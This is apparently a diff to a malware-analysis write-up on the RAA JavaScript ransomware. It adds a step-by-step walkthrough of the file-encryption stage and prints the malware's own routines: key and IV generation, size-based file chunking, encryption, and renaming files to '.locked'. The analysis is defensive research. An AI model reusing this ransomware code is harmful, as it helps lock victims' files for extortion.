@@ -94,14 +94,14 @@ Next paragraphs describe in details each function of RAA. Here's a very simplifi
 						  |
 						  v
 					iKTzQKbfDJs()
+					      |
+					      v
 					PLnEyqCPKHV()
-						  |
-						  |
-						  v
+					      v
 					nXmsNjMpKTv()
-						  |
-						  v
-					KWgwJwOlqJcs()
+				    do {
+						KWgwJwOlqJcs(file_to_encrypt)
+					} while (files_to_encrypt)
 
 
 
@@ -597,7 +597,7 @@ function VGCDtihB() {
 As you can see, it uses similar method as for first _rtf_ file: some simple Base64 string manipulation with couple of replace() function with Regular Expression calls.
 
 
-Next, there is **PLnEyqCPKHV()** function call:
+Next, there is **PLnEyqCPKHV()** function call, which is the main loop encrypting each file through **KWgwJwOlqJcs()** function described later:
 
 ```javascript
 function PLnEyqCPKHV() {
@@ -670,7 +670,7 @@ Finally, **nXmsNjMpKTv()** returns an array contains all filenames from each dri
 
 ### Last step - encryption of files
 
-**KWgwJwOlqJcs()** finishes all process. This function contains a couple of its own, private, scoped functions with the one, which is responsible for encryption:
+Function **KWgwJwOlqJcs()** finishes whole process. This function contains a couple of its own, private scoped functions with the one, which is responsible for encryption:
 
 ```javascript
 function ukBnxEOtjm(EQs) {
@@ -681,16 +681,294 @@ function ukBnxEOtjm(EQs) {
 }
 ```
 
-But before each file passes through those four lines, a lot of other things are done.
+But before each file passes through those four lines, a lot of other things are done. Let's go through them step by step.
 
---
+First, two variables are initialized with values returned from **rStinsVp()** function:
 
+```javascript
+var HZtSmFNRdJM_data = rStinsVp(VKw);
+var qPCIyff = rStinsVp(VKw);
+```
+
+This function takes one argument, **VKw**, which is one of two values returned from remote server (see 'Connect to the server
+' part of this writeup with **get_HZtSmFNRdJM()** function description above).
+
+
+```javascript
+function rStinsVp(rand) {
+    var eqQu = [];
+    var EPtLPmand = -1;
+    do {
+        EPtLPmand += 1;
+        eqQu[EPtLPmand] = Math.floor((Math.random() * 2000) + 1);
+        if (eqQu[EPtLPmand] < 10) {
+            eqQu[EPtLPmand] = "000" + eqQu[EPtLPmand];
+        } else if (eqQu[EPtLPmand] >= 10 && eqQu[EPtLPmand] < 100) {
+            eqQu[EPtLPmand] = "00" + eqQu[EPtLPmand];
+        } else if (eqQu[EPtLPmand] >= 100 && eqQu[EPtLPmand] < 1000) {
+            eqQu[EPtLPmand] = "0" + eqQu[EPtLPmand];
+        } else {
+            eqQu[EPtLPmand] = eqQu[EPtLPmand];
+        }
+    } while (eqQu.length < 32);
+    var xjLCtcIO = "";
+    var EPtLPmand2 = -1;
+    var vPdyagHuFMMj = [];
+    do {
+        EPtLPmand2 += 1;
+        vPdyagHuFMMj[EPtLPmand2] = parseInt(eqQu[EPtLPmand2]);
+        xjLCtcIO = xjLCtcIO + rand.charAt(vPdyagHuFMMj[EPtLPmand2]);
+    } while (xjLCtcIO.length < 32);
+    var gieJISwveNlD = [];
+    gieJISwveNlD[0] = eqQu;
+    gieJISwveNlD[1] = xjLCtcIO;
+    return gieJISwveNlD;
+}
+```
+
+Logic of this function is quite simple: it returns an array with two elements: first is another array with 32 4-digits numbers and second one is 32 characters length string.
+
+I ran this function and as argument I've passed some random MD5 hash. Results were similar for any other strings as well:
+
+```javascript
+console.log(rStinsVp("c2378574f4fa4a4353d1ab7e2961fd88"));
+```
+
+```
+$ node rStinsVp.js
+[ [ '0981',
+    '0829',
+    '0272',
+    '0715',
+    '0045',
+    '0193',
+    '0881',
+    1361,
+    1517,
+    '0957',
+    '0546',
+    '0621',
+    '0932',
+    1659,
+    1102,
+    1861,
+    '0339',
+    1688,
+    '0941',
+    '0756',
+    1727,
+    '0257',
+    '0565',
+    1963,
+    '0912',
+    '0333',
+    '0269',
+    1095,
+    1191,
+    1962,
+    '0514',
+    '0939' ],
+  'cccccccccccccccccccccccccccccccc' ]
+```
+So **HZtSmFNRdJM_data** and **qPCIyff** contains some similar results as above.
+
+
+Next call is **udpIHxNm()** function, which takes as an argument name of the file to encrypt (from list of files generated in function **nXmsNjMpKTv()**; each file is passed here through _do..while_ loop in **PLnEyqCPKHV()** by function **KWgwJwOlqJcs()** called per each file name):
+
+```javascript
+function udpIHxNm(IMhTname) {
+    var SlSPWu = WScript.CreateObject("ADODB.Stream");
+    SlSPWu.CharSet = '437';
+    SlSPWu.Open();
+    SlSPWu.LoadFromFile(IMhTname);
+    var hXpHGpZ = [];
+    hXpHGpZ[0] = [];
+    hXpHGpZ[1] = [];
+    var PRuJZyAvfeza = SlSPWu.Size;
+    if (PRuJZyAvfeza > 6122 && PRuJZyAvfeza < 5000000) {
+        var GinRqOjln = OQlYdejWlC(2000, 2040);
+        hXpHGpZ[0][0] = SlSPWu.ReadText(GinRqOjln) + "RAA-SEP";
+        var kWsAN = Math.floor(PRuJZyAvfeza / 2) - 3060;
+        hXpHGpZ[1][0] = SlSPWu.ReadText(kWsAN) + "RAA-SEP";
+        hXpHGpZ[0][1] = SlSPWu.ReadText(GinRqOjln) + "RAA-SEP";
+        var iPZDBPG = PRuJZyAvfeza - (SlSPWu.Position + GinRqOjln);
+        hXpHGpZ[1][1] = SlSPWu.ReadText(iPZDBPG) + "RAA-SEP";
+        hXpHGpZ[0][2] = SlSPWu.ReadText(GinRqOjln) + "RAA-SEP";
+        SlSPWu.Close;
+        jMvqmKSQu(hXpHGpZ);
+    } else if (PRuJZyAvfeza > 5000000 && PRuJZyAvfeza <= 500000000) {
+        qqJ(IMhTname)
+    } else if (PRuJZyAvfeza <= 6122) {
+        hXpHGpZ[0][0] = SlSPWu.ReadText;
+        SlSPWu.Close;
+        jMvqmKSQu(hXpHGpZ);
+    } else {
+        hXpHGpZ = 0;
+        SlSPWu.Close;
+        jMvqmKSQu(hXpHGpZ);
+    }
+    return 0;
+}
+
+udpIHxNm(IMhTname);
+```
+
+Again, let's analyze this code line by line, because some interesting things are going on here.
+
+First, Windows Script object to manipulate file is initialized and file is loaded and its size is checked:
+
+```javascript
+var SlSPWu = WScript.CreateObject("ADODB.Stream");
+SlSPWu.CharSet = '437';
+SlSPWu.Open();
+SlSPWu.LoadFromFile(IMhTname);
+var hXpHGpZ = [];
+hXpHGpZ[0] = [];
+hXpHGpZ[1] = [];
+var PRuJZyAvfeza = SlSPWu.Size;
+
+```
+
+Based on file size, different next step is being performed:
+
+```javascript
+if (PRuJZyAvfeza > 6122 && PRuJZyAvfeza < 5000000) {
+    var GinRqOjln = OQlYdejWlC(2000, 2040);
+    hXpHGpZ[0][0] = SlSPWu.ReadText(GinRqOjln) + "RAA-SEP";
+    var kWsAN = Math.floor(PRuJZyAvfeza / 2) - 3060;
+    hXpHGpZ[1][0] = SlSPWu.ReadText(kWsAN) + "RAA-SEP";
+    hXpHGpZ[0][1] = SlSPWu.ReadText(GinRqOjln) + "RAA-SEP";
+    var iPZDBPG = PRuJZyAvfeza - (SlSPWu.Position + GinRqOjln);
+    hXpHGpZ[1][1] = SlSPWu.ReadText(iPZDBPG) + "RAA-SEP";
+    hXpHGpZ[0][2] = SlSPWu.ReadText(GinRqOjln) + "RAA-SEP";
+    SlSPWu.Close;
+    jMvqmKSQu(hXpHGpZ);
+} else if (PRuJZyAvfeza > 5000000 && PRuJZyAvfeza <= 500000000) {
+    qqJ(IMhTname)
+} else if (PRuJZyAvfeza <= 6122) {
+    hXpHGpZ[0][0] = SlSPWu.ReadText;
+    SlSPWu.Close;
+    jMvqmKSQu(hXpHGpZ);
+} else {
+    hXpHGpZ = 0;
+    SlSPWu.Close;
+    jMvqmKSQu(hXpHGpZ);
+}
+```
+* if file size is between 6122 bytes and 4,76 MB (exactly 4882 kB) - then **hXpHGpZ** array is created, and some random values with "RAA-SEP" string appended to them are stored in this array. Next, this array is passed as an argument to **jMvqmKSQu()** function.
+
+* if file size is more than 4,76 MB and less than 476 MB - **qqJ()** function is called with file name as an argument
+
+* otherwise, if file size is less than or equal 6122 bytes - file content read in line:
+```
+hXpHGpZ[0][0] = SlSPWu.ReadText;``` and **hXpHGpZ** array is passed to **jMvqmKSQu()** function. 
+
+Files bigger than 476 MB are ommited.
+
+Let's see what **jMvqmKSQu()** and **qqJ()** called here are doing:
+
+```javascript
+function jMvqmKSQu(hXpHGpZ) {
+    if (hXpHGpZ[1].length != 0) {
+        var DftonCbPCyQR = hXpHGpZ[0].join("");
+        DftonCbPCyQR = ukBnxEOtjm(DftonCbPCyQR);
+        DftonCbPCyQR = DftonCbPCyQR + "=END=OF=HEADER=";
+        DftonCbPCyQR = DftonCbPCyQR + hXpHGpZ[1].join("") + "IDNUM=" + cVjZujcP + "KEY_LOGIC=" + HZtSmFNRdJM_data[0] + "IV_LOGIC=" + qPCIyff[0] + "LOGIC_ID=1";
+        omaDplUyHou(DftonCbPCyQR);
+    } else if (hXpHGpZ == 0) {
+        var DftonCbPCyQR = 0;
+        omaDplUyHou(DftonCbPCyQR);
+    } else {
+        var DftonCbPCyQR = hXpHGpZ[0][0];
+        DftonCbPCyQR = ukBnxEOtjm(DftonCbPCyQR);
+        DftonCbPCyQR = DftonCbPCyQR + "IDNUM=" + cVjZujcP + "KEY_LOGIC=" + HZtSmFNRdJM_data[0] + "IV_LOGIC=" + qPCIyff[0] + "LOGIC_ID=2";
+        omaDplUyHou(DftonCbPCyQR);
+    }
+    return DftonCbPCyQR;
+}
+```
+
+Depends on content of **hXpHGpZ**, which can be two dimensional array or 0, different actions are taken. Anyway, finally file is being encrypted in function **ukBnxEOtjm()** and after that **omaDplUyHou()** function is called:
+
+```javascript
+function omaDplUyHou(lsYZxzUm) {
+    var IxC = new ActiveXObject('ADODB.Stream');
+    IxC.Type = 2;
+    IxC.Charset = "437";
+    IxC.Open();
+    if (lsYZxzUm != 0) {
+        IxC.WriteText(lsYZxzUm);
+        IxC.SaveToFile(IMhTname, 2);
+        IxC.Close();
+        var DmYbWSaT = new ActiveXObject("Scripting.FileSystemObject");
+        DmYbWSaT.MoveFile(IMhTname, IMhTname += ".locked");
+    } else {
+        IxC.Close();
+    }
+    return 0;
+}
+```
+
+This function takes encrypted file, creates new _ADODB.Stream_ object and uses it to save that file into new one, adding extension _.locked_ at the end of original name.
+
+```javascript
+var DmYbWSaT = new ActiveXObject("Scripting.FileSystemObject");
+DmYbWSaT.MoveFile(IMhTname, IMhTname += ".locked");
+```
+Method _MoveFile_ (https://msdn.microsoft.com/en-us/library/2wcf3ba6(v=vs.84).aspx) is responsible for the worst part of whole operation: it takes two arguments, source name and destination name,
+and overrides original, not encrypted file name with the new, encrypted version.
+
+Second function used in encryption process is 
+
+```javascript
+function qqJ(IMhTname) {
+    var SlSPWu = WScript.CreateObject("ADODB.Stream");
+    SlSPWu.CharSet = '437';
+    SlSPWu.Open();
+    SlSPWu.LoadFromFile(IMhTname);
+    var FhDYKCTNZFu = WScript.CreateObject("ADODB.Stream");
+    FhDYKCTNZFu.CharSet = '437';
+    FhDYKCTNZFu.Open();
+    var GinRqOjln = OQlYdejWlC(90000, 125000);
+    var PRuJZyAvfeza = SlSPWu.Size;
+    var VVe = SlSPWu.ReadText(GinRqOjln);
+    var cBKyRXWGPWBs = ukBnxEOtjm(VVe);
+    cBKyRXWGPWBs = String(cBKyRXWGPWBs);
+    var rMkTeqZm = cBKyRXWGPWBs.length;
+    SlSPWu.Position = PRuJZyAvfeza - GinRqOjln;
+    var ECgBWYtoib = SlSPWu.ReadText(GinRqOjln);
+    var AblANuF = ukBnxEOtjm(ECgBWYtoib);
+    AblANuF = String(AblANuF);
+    var QfYmGGcYOFB = AblANuF.length;
+    var IJDZ = ",";
+    SlSPWu.Position = PRuJZyAvfeza - GinRqOjln;
+    SlSPWu.SetEOS;
+    SlSPWu.WriteText(cBKyRXWGPWBs);
+    SlSPWu.WriteText(AblANuF);
+    SlSPWu.WriteText(rMkTeqZm);
+    SlSPWu.WriteText(IJDZ);
+    SlSPWu.WriteText(QfYmGGcYOFB);
+    SlSPWu.WriteText(IJDZ);
+    var ids = "IDNUM=" + cVjZujcP + "KEY_LOGIC=" + HZtSmFNRdJM_data[0] + "IV_LOGIC=" + qPCIyff[0] + "LOGIC_ID=3";
+    SlSPWu.WriteText(ids);
+    SlSPWu.Position = GinRqOjln;
+    SlSPWu.CopyTo(FhDYKCTNZFu);
+    SlSPWu.Close;
+    FhDYKCTNZFu.SaveToFile(IMhTname, 2);
+    FhDYKCTNZFu.Close;
+    var DmYbWSaT = new ActiveXObject("Scripting.FileSystemObject");
+    DmYbWSaT.MoveFile(IMhTname, IMhTname += ".locked");
+    return 0;
+}
+```
 
 ## Summary
 
 As a web developer, I used to write JavaScript code for a little bit different purposes. AngularJS, React, Single Page Applications, Node and server side JS as well - this stuff. 
 
-But RAA confirms that JavaScript can be used for, literally, everything. Even for creating the worst nightmare of each user, which is IMHO Ransomware
+But RAA confirms that JavaScript can be used for, literally, everything. Even for creating the worst nightmare of each user, which is ransomware. 
+
+And not only RAA uses JavaScript for such things. @hasherezade recently described in details Locky ransomware downloader script, which is also created in JavaScript (see https://blog.malwarebytes.com/threat-analysis/2016/07/from-locky-with-love-reading-malicious-attachments/ )
 
 
 
@@ -703,13 +981,21 @@ Source code of RAA:
 https://malwr.com/analysis/YmE4MDNlMzk2MjY3NDdlYWE1NzFiOTNlYzVhZTlkM2Y/
 
 
+**SophosLabs blog**			
+
 Sophos blog post about RAA:
 
-**SophosLabs blog**			
 https://nakedsecurity.sophos.com/2016/06/20/ransomware-thats-100-pure-javascript-no-download-required/
 
 
-Very detailed analysis of RAA, by ReaQta:
 
 **RAA – An entirely new JS ransomware delivering Pony malware**
+
+Very detailed analysis of RAA, by ReaQta:
+
 https://reaqta.com/2016/06/raa-ransomware-delivering-pony/
+
+
+**Locky downloader script analysis by @hasherezade**
+
+https://blog.malwarebytes.com/threat-analysis/2016/07/from-locky-with-love-reading-malicious-attachments/
